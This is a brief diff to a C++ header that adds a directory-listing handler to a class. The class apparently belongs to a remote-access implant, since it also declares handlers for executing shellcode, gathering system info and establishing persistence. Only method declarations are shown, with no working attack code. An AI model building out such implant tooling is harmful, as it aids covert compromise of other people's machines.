@@ -21,6 +21,7 @@ public:
 	void handleExecuteShellcode(const InternalMessage& msg);
 
 	void handleSystemInfo(const InternalMessage& msg);
+    void handleListDirectory(const InternalMessage& msg);
 
 	// TODO: make a subclass called PersistenceController?
 	void handleEstablishPersistence(const InternalMessage& msg);
